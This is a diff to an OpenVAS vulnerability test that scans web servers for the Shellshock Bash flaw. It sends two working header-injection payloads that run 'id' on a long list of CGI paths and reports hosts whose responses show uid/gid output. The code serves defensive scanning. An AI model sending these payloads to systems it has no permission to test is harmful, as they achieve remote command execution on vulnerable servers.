@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bash_shellshock_remote_cmd_exec_vuln.nasl 4783 2016-12-16 09:40:15Z mime $
+# $Id: gb_bash_shellshock_remote_cmd_exec_vuln.nasl 7171 2017-09-18 10:53:17Z cfischer $
 #
 # GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability
 #
@@ -28,12 +28,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804489");
-  script_version("$Revision: 4783 $");
+  script_version("$Revision: 7171 $");
   script_cve_id("CVE-2014-6271","CVE-2014-6278");
   script_bugtraq_id(70103);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-16 10:40:15 +0100 (Fri, 16 Dec 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-09-18 12:53:17 +0200 (Mon, 18 Sep 2017) $");
   script_tag(name:"creation_date", value:"2014-09-25 18:47:16 +0530 (Thu, 25 Sep 2014)");
   script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability");
 
@@ -67,8 +67,9 @@ if(description)
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl","webmirror.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "webmirror.nasl");
   script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_add_preference(name:"Shellshock: Check CGIs in KB:", type:"checkbox", value:"no");
 
@@ -79,74 +80,6 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-
-function _check( url )
-{
-  attacks = make_list( 
-                      '() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;',
-                      '() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }'
-                     );
-
-  foreach attack ( attacks )
-  {
-    foreach method ( make_list( "GET","POST") )
-    {  
-      foreach http_field (make_list("User-Agent:", "Referer:", "Cookie:", "OpenVAS:"))
-      {
-        sndReq = string( method," ", url, " HTTP/1.1\r\n",
-                        "Host: ", get_host_name() , "\r\n",
-                         http_field, attack, "\r\n", 
-                         "Connection: close\r\n",
-                         "Accept: */*\r\n\r\n");
-
-        rcvRes = http_send_recv(port:http_port, data:sndReq);
- 
-        if(rcvRes =~ "uid=[0-9]+\(.*gid=[0-9]+\(.*")
-        {
-          uid = eregmatch(pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:rcvRes );
-
-          report = 'By requesting the URL "' + url + '" with the "' + http_field + '" header set to\n"' + 
-                   attack + '"\nit was possible to execute the "id" command.\n\nResult: ' + uid[1] + '\n';
-
-          expert_info = 'Request:\n'+ sndReq + 'Response:\n' + rcvRes + '\n';
-
-          security_message( port:http_port, data:report, expert_info:expert_info );
-          exit(0);
-        }
-      }
-    }
-  }  
-}
-
-function add_files( extensions )
-{
-  foreach ext ( extensions )
-  {
-    known = FALSE;
-
-    if( "-" >< ext )
-    {
-      e = split( ext, sep:" - ", keep:FALSE );
-      if( isnull( e[0] ) ) continue;
-      ext = e[0];
-      chomp( ext );
-    }
-
-    for( x = 0; x < max_index( cgis ); x++ )
-    {
-      if( ext == cgis[x]) known = TRUE;
-    }
-
-    if( ereg( pattern:"\.(js|css|gif|png|jpeg|jpg|pdf|ico)$", string:tolower( ext ) ) )
-      continue;
-
-    if( ! known ) cgis[i++] = ext;
-
-  }
-}
-
-## Get HTTP Port
-http_port = get_http_port(default:80);
 
 cgis = make_list();
 cgis[i++] = '/';
@@ -215,6 +148,72 @@ cgis[i++] = '/cgi-bin/pathtest.pl';
 cgis[i++] = '/cgi-bin/contact.cgi';
 cgis[i++] = '/cgi-bin/uname.cgi';
 
+function _check( url, http_port, host )
+{
+  attacks = make_list( 
+                      '() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;',
+                      '() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }'
+                     );
+
+  foreach attack ( attacks )
+  {
+    foreach method ( make_list( "GET","POST") )
+    {  
+      foreach http_field (make_list("User-Agent:", "Referer:", "Cookie:", "OpenVAS:"))
+      {
+        sndReq = string( method," ", url, " HTTP/1.1\r\n",
+                        "Host: ", host, "\r\n",
+                         http_field, attack, "\r\n", 
+                         "Connection: close\r\n",
+                         "Accept: */*\r\n\r\n");
+        rcvRes = http_send_recv(port:http_port, data:sndReq);
+ 
+        if(rcvRes =~ "uid=[0-9]+\(.*gid=[0-9]+\(.*")
+        {
+          uid = eregmatch(pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:rcvRes );
+
+          report = 'By requesting the URL "' + url + '" with the "' + http_field + '" header set to\n"' + 
+                   attack + '"\nit was possible to execute the "id" command.\n\nResult: ' + uid[1] + '\n';
+
+          expert_info = 'Request:\n'+ sndReq + 'Response:\n' + rcvRes + '\n';
+
+          security_message( port:http_port, data:report, expert_info:expert_info );
+          exit(0);
+        }
+      }
+    }
+  }  
+}
+
+function add_files( extensions )
+{
+  foreach ext ( extensions )
+  {
+    known = FALSE;
+
+    if( "-" >< ext )
+    {
+      e = split( ext, sep:" - ", keep:FALSE );
+      if( isnull( e[0] ) ) continue;
+      ext = e[0];
+      chomp( ext );
+    }
+
+    for( x = 0; x < max_index( cgis ); x++ )
+    {
+      if( ext == cgis[x]) known = TRUE;
+    }
+
+    if( ereg( pattern:"\.(js|css|gif|png|jpeg|jpg|pdf|ico)$", string:tolower( ext ) ) )
+      continue;
+
+    if( ! known ) cgis[i++] = ext;
+
+  }
+}
+
+http_port = get_http_port(default:80);
+
 check_kb_cgis = script_get_preference("Shellshock: Check CGIs in KB:");
 
 if( check_kb_cgis == "yes" )
@@ -226,10 +225,11 @@ if( check_kb_cgis == "yes" )
   if( kb_cgis ) add_files( extensions:kb_cgis );
 }
 
+host = http_host_name( port:http_port );
+
 foreach dir ( cgis )
 {
-  _check( url:dir );
+  _check( url:dir, http_port:http_port, host:host );
 }
 
 exit( 99 );
-
